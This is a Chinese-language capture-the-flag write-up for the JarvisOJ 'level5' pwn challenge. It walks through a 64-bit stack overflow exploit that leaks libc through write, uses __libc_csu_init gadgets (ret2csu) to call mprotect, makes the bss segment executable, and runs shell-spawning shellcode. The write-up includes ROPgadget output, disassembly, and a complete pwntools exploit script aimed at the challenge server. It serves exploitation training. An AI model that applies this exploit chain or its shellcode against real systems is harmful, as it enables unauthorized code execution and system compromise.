# jarvisoj--pwn--level5

题目和level3_x64一样，但让我们尝试使用mmap和mprotect完成。

我们先来学习一下mmap和mprotect函数

mmap函数创建一块内存区域，将一个文件映射到该区域，进程可以像操作内存一样操作文件。

mprotect函数可以改变一块内存区域的权限(以页为单位)。

mprotect函数是可以改变一个段的权限的，可以利用这一特点将bss段改为可执行，将shellcode写到bss段。

## 利用思路

找到mprotect的地址，把shellcode写进bss，并伪造一个bss_got，然后用mprotect函数把shellcode提权，最后执行bss_got。

### 第一步 求偏移

利用write函数把write函数的地址泄露出来，再与libc文件比较，求出偏移offset

```python
payload1="A"*（0x80+8）+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(write_got)+"deadbuff"+p64(write_plt)+p64(vul_addr)
```

64位需要rdi和rsi

```
root@kali:~/下载/level3_x64# ROPgadget --binary ./level3_x64 --only "pop|ret"
Gadgets information
============================================================
0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006b0 : pop r14 ; pop r15 ; ret
0x00000000004006b2 : pop r15 ; ret
0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400550 : pop rbp ; ret
0x00000000004006b3 : pop rdi ; ret
0x00000000004006b1 : pop rsi ; pop r15 ; ret
0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400499 : ret
```

offset = write_addr - libc_write

mprotect_addr=libc_mprotect + offset

### 第二步 写shellcode和伪造bss_got

利用read函数把shellcode写进bss段



shellcode的获取

```python
shellcode=asm(shellcraft.sh())
```

bss_got地址可以再got表中找一个空的地址，利用read函数把shellcode地址写到got表中

```
.got.plt:0000000000600A40 _got_plt        segment para public 'DATA' use64
.got.plt:0000000000600A40                 assume cs:_got_plt
.got.plt:0000000000600A40                 ;org 600A40h
.got.plt:0000000000600A40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
.got.plt:0000000000600A48 qword_600A48    dq 0                    ; DATA XREF: sub_4004A0↑r
.got.plt:0000000000600A50 qword_600A50    dq 0                    ; DATA XREF: sub_4004A0+6↑r
.got.plt:0000000000600A58 off_600A58      dq offset write         ; DATA XREF: _write↑r
.got.plt:0000000000600A60 off_600A60      dq offset read          ; DATA XREF: _read↑r
.got.plt:0000000000600A68 off_600A68      dq offset __libc_start_main
.got.plt:0000000000600A68                                         ; DATA XREF: ___libc_start_main↑r
.got.plt:0000000000600A70 off_600A70      dq offset __gmon_start__
.got.plt:0000000000600A70                                         ; DATA XREF: ___gmon_start__↑r
.got.plt:0000000000600A70 _got_plt        ends
```



### 第三步 shellcode提权

需要调用这个mprotect函数，我们发现它有三个参数，第一个是要设置的地址(edi)，第二个是设置的长度(esi)，第三个是权限值(edx)，但是我们在level3中发现简单的gadgets并没有pop edx，这时候，我们可以利用x64下的__libc_scu_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。

```
.text:0000000000400650 __libc_csu_init proc near               ; DATA XREF: _start+16o
.text:0000000000400650                 push    r15
.text:0000000000400652                 mov     r15d, edi
.text:0000000000400655                 push    r14
.text:0000000000400657                 mov     r14, rsi
.text:000000000040065A                 push    r13
.text:000000000040065C                 mov     r13, rdx
.text:000000000040065F                 push    r12
.text:0000000000400661                 lea     r12, __frame_dummy_init_array_entry
.text:0000000000400668                 push    rbp
.text:0000000000400669                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:0000000000400670                 push    rbx
.text:0000000000400671                 sub     rbp, r12
.text:0000000000400674                 xor     ebx, ebx
.text:0000000000400676                 sar     rbp, 3
.text:000000000040067A                 sub     rsp, 8
.text:000000000040067E                 call    _init_proc
.text:0000000000400683                 test    rbp, rbp
.text:0000000000400686                 jz      short loc_4006A6
.text:0000000000400688                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400690
.text:0000000000400690 loc_400690:                             ; CODE XREF: __libc_csu_init+54j
.text:0000000000400690                 mov     rdx, r13
.text:0000000000400693                 mov     rsi, r14
.text:0000000000400696                 mov     edi, r15d
.text:0000000000400699                 call    qword ptr [r12+rbx*8]
.text:000000000040069D                 add     rbx, 1
.text:00000000004006A1                 cmp     rbx, rbp
.text:00000000004006A4                 jnz     short loc_400690
.text:00000000004006A6
.text:00000000004006A6 loc_4006A6:                             ; CODE XREF: __libc_csu_init+36j
.text:00000000004006A6                 add     rsp, 8
.text:00000000004006AA                 pop     rbx
.text:00000000004006AB                 pop     rbp
.text:00000000004006AC                 pop     r12
.text:00000000004006AE                 pop     r13
.text:00000000004006B0                 pop     r14
.text:00000000004006B2                 pop     r15
.text:00000000004006B4                 retn
.text:00000000004006B4 __libc_csu_init endp
```

在loc_4006A6这个函数下面，有6个pop。在loc_400690函数下面刚好前三个寄存器的赋值语句，以及一个call函数调用，简直完美有没有。所以我们只需要先调用loc_4006A6将r13,r14,r15设置为mprotect函数的三个参数值，将r12设置为mprotect的地址，rbx置0，再调用loc_400690的时候，自然就执行mprotect函数了。（为了跳出这个循环，还需将rbp设置为1）

exp：

```python
from pwn import *
context.binary = './level3_x64'
#conn=process('./level3_x64')
conn=remote("pwn2.jarvisoj.com", "9884")
e=ELF('./level3_x64')
#libc=ELF('/usr/lib64/libc-2.26.so')
libc=ELF('./libc-2.19.so')
pad=0x80
vul_addr=e.symbols["vulnerable_function"]
write_plt=e.symbols['write']
write_got=e.got['write']
read_plt=e.symbols['read']
pop_rdi=0x4006b3 #pop rdi;ret
pop_rsi=0x4006b1 #pop rsi;pop r15;ret
##############################################
#get mprotect_addr
#edx=0x200 is not serious
payload1="A"*pad+"BBBBBBBB"+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(write_got)+"deadbuff"+p64(write_plt)+p64(vul_addr)
conn.recv()
sleep(0.2)
conn.send(payload1)
write_addr=u64(conn.recv(8))
pause()
#print write_addr 
libc_write=libc.symbols['write']
libc_mprotect=libc.symbols['mprotect']
mprotect_addr=(libc_mprotect-libc_write)+write_addr
print (hex(mprotect_addr))
#############################################
#write the shellcode to bss
bss_addr=e.bss()
shellcode=asm(shellcraft.sh())
payload2="A"*pad+"BBBBBBBB"+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss_addr)+"deadbuff"+p64(read_plt)+p64(vul_addr)
sleep(0.2)
conn.send(payload2)
sleep(0.2)
conn.send(shellcode)
#############################################
#write the bss to got_table
pause()
bss_got=0x600a47#any empty got_table address is ok
payload3="A"*pad+"BBBBBBBB"+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss_got)+"deadbuff"+p64(read_plt)+p64(vul_addr)
sleep(0.2)
conn.send(payload3)
sleep(0.2)
conn.send(p64(bss_addr))
#############################################
#write the mprotect to got_table
pause()
mprotect_got=0x600a51#any empty got_table address is ok
payload4="A"*pad+"BBBBBBBB"+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(mprotect_got)+"deadbuff"+p64(read_plt)+p64(vul_addr)
sleep(0.2)
conn.send(payload4)
sleep(0.2)
conn.send(p64(mprotect_addr))
#############################################
pause()
#add rsp,8 
#pop rbx
#pop rbp
#pop r12
#pop r13
#pop r14
#pop r15
#retn
csu_start=0x4006a6
#mov rdx,r13  the 3rd parm
#mov rsi,r14  the 2nd parm  
#mov edi,r15  the 1st parm
#call [r12] 
#add rbx,1
#cmp rbx,rbp
#jnz short loc_400690
csu_end=0x400690
payload5="A"*pad+"BBBBBBBB"+p64(csu_start)
#try to call mprotect
payload5+='a'*8+p64(0)+p64(1)+p64(mprotect_got)+p64(7)+p64(0x1000)+p64(0x600000)
payload5+=p64(csu_end)
#try to call shellcode
payload5+='a'*8+p64(0)+p64(1)+p64(bss_got)+p64(0)+p64(0)+p64(0)
payload5+=p64(csu_end)
sleep(0.2)
conn.send(payload5)
conn.interactive()
```

